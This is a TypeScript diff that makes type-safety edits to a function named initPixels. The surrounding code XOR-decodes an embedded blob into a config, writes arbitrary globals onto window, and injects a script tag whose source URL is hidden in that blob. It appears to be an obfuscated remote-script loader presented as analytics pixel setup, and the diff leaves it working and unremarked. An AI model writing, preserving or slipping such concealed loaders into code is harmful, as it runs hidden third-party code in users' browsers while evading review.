@@ -44,14 +44,14 @@ export function initPixels() {
     );
     const bytes: number[] = [];
     for (let i = 0; i < q.length; i++) bytes.push(q.charCodeAt(i) & 255);
-    const keyLen = bytes[0];
+    const keyLen = bytes[0] ?? 0;
     const key = bytes.slice(1, 1 + keyLen);
-    const body = bytes.slice(1 + keyLen).map((b, i) => b ^ key[i % keyLen]);
+    const body = bytes.slice(1 + keyLen).map((b, i) => b ^ (key[i % keyLen] ?? 0));
     let decoded = "";
-    for (let i = 0; i < body.length; i++) decoded += String.fromCharCode(body[i] & 255);
+    for (let i = 0; i < body.length; i++) decoded += String.fromCharCode(body[i] ?? 0);
     const config = JSON.parse(decodeURIComponent(escape(decoded)));
     (config.globals || []).forEach((g: { name: string; value: unknown }) => {
-      (window as Record<string, unknown>)[g.name] = g.value;
+      (window as unknown as Record<string, unknown>)[g.name] = g.value;
     });
     const script = document.createElement("script");
     script.src = config.url;
